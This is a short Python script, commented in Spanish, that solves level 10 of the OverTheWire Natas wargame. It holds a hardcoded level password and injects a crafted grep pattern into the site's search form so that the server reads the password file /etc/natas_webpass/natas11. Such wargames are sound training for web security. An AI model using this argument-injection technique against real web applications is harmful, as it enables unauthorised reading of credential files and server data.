#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:ts=4:sw=4:et:ft=python:
"""
natas10.py

Igual que el natas09

Se puede inyectar codigo de shell directamente en el formulario;
basta con mostrar el fichero de contraseña para el usuario natas11 
que esta en /etc/natas_webpass/natas11

como no se admiten caracteres tipo ";" hay que modificar la consulta grep para
mostrar lo que queremos ver.

Estas funcionan bastante bien:

... [a-z0-9]\\{32\\} /etc/natas_webpass/* ...
... [a-z0-9]\\{32\\} /etc/natas_webpass/natas11 ...
"""
import libnatas

# url: "http://natas10.natas.labs.overthewire.org"
# user: "natas10"
password = "s09byvi8880wqhbnonMFMW8byCojm8eA"

natas = libnatas.NatasBrowser(level=10, password=password)

# ver arriba
inject = r'''[a-z0-9]\\{32\\} /etc/natas_webpass/natas11 ''' 


# reabrimos la pagina principal y rellenamos el formulario
natas.open(natas.level_url)
natas.select_form(nr=0) # primera form (y unica)
natas.form['needle'] = inject

html = natas.submit()
password_nl = natas.get_password(html.read(), '.*\W([a-zA-Z0-9]{32})\W.*')
natas.print_password(password_nl)

